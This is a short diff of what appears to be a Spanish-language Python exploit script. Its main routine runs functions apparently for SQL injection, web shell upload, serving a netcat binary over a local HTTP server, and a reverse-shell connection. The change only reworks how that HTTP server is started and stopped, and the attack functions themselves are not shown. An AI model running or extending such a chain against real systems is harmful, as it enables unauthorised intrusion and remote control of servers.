@@ -82,12 +82,19 @@ def conection():
 
 
 if __name__ == '__main__':
-    print(f'[+] Recuerda estar esperando conexión en netcat en el puerto {sys.argv[2]}\n\n')
+    print(f'\n[+] Recuerda estar esperando conexión en netcat en el puerto {sys.argv[2]}\n\n')
     sleep(2)
-    subprocess.Popen(["python3", "-m", "http.server", "80"])
     getNetcat()
     sqli()
     uploadshell()
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:
+            so.bind(('localhost', 80))
+            http_server = subprocess.Popen(["python3", "-m", "http.server", "80"])
+    except OSError:
+            print("\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor")
+   
     uploadNC()
+    http_server.terminate()
     conection()
     
